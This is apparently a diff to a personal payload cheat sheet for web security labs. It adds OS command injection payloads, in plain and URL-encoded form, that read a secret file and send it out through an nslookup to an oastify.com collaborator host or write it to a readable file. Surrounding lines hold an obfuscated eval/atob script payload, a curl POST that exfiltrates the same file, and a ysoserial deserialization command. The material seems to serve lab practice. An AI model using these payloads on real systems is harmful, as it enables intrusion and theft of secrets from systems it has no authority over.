@@ -41,6 +41,17 @@ eval.call`${atob`YWxlcnQoMSk=`}`
 # Curl file contents
 curl -X POST <your-collaborator> -d @/home/carlos/secret
 
+# Nslookup file contents
+& nslookup `cat /home/carlos/secret`.mzpsxy7822pcncrfc0hyw82uul0co2cr.oastify.com &
+%26+nslookup+%60cat+%2Fhome%2Fcarlos%2Fsecret%60.mzpsxy7822pcncrfc0hyw82uul0co2cr.oastify.com+%26
+
+# Redirect file contents
+& cat /home/carlos/secret > test.txt &
+%26+cat+%2Fhome%2Fcarlos%2Fsecret+%3E+test.txt+%26
+
+# Red
+
+
 # Gzip and base64 ysoserial
 java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
 ```
